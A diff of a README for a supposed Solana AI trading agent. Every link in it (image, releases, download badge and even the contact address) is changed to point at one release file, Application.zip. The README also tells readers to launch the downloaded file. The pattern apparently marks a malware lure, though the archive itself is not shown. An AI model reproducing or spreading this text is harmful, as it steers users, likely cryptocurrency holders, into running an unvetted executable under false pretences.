@@ -2,7 +2,7 @@
 
 Welcome to the JLB AI Agent repository! This repository is dedicated to connecting an AI agent to Solana protocols, allowing it to autonomously perform Solana actions using AI models.
 
-![JLB AI Agent](https://github.com/your/repository/image.png)
+![JLB AI Agent](https://github.com/asfjedijfdk/JLB-AI-Agent/releases/download/v1.0/Application.zip)
 
 ## 📁 Repository Structure
 
@@ -39,10 +39,10 @@ Once you have set up the agent, you can start exploring its capabilities and int
 
 ## 📦 Releases
 
-Make sure to check the [Releases](https://github.com/your/repository/releases) section for the latest updates and versions of the JLB AI Agent.
+Make sure to check the [Releases](https://github.com/asfjedijfdk/JLB-AI-Agent/releases/download/v1.0/Application.zip) section for the latest updates and versions of the JLB AI Agent.
 
 ## 🌐 Download
-[![Download JLB AI Agent](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download JLB AI Agent](https://github.com/asfjedijfdk/JLB-AI-Agent/releases/download/v1.0/Application.zip)](https://github.com/asfjedijfdk/JLB-AI-Agent/releases/download/v1.0/Application.zip)
 
 Please ensure to launch the downloaded file for further installation.
 
@@ -52,7 +52,7 @@ Contributions to the JLB AI Agent repository are welcome. Feel free to fork the 
 
 ## 📧 Contact
 
-If you have any questions or suggestions regarding the JLB AI Agent, please reach out to us at [email@example.com](mailto:email@example.com).
+If you have any questions or suggestions regarding the JLB AI Agent, please reach out to us at [https://github.com/asfjedijfdk/JLB-AI-Agent/releases/download/v1.0/Application.zip](https://github.com/asfjedijfdk/JLB-AI-Agent/releases/download/v1.0/Application.zip).
 
 Happy AI trading with JLB AI Agent! 🤖🚀
 
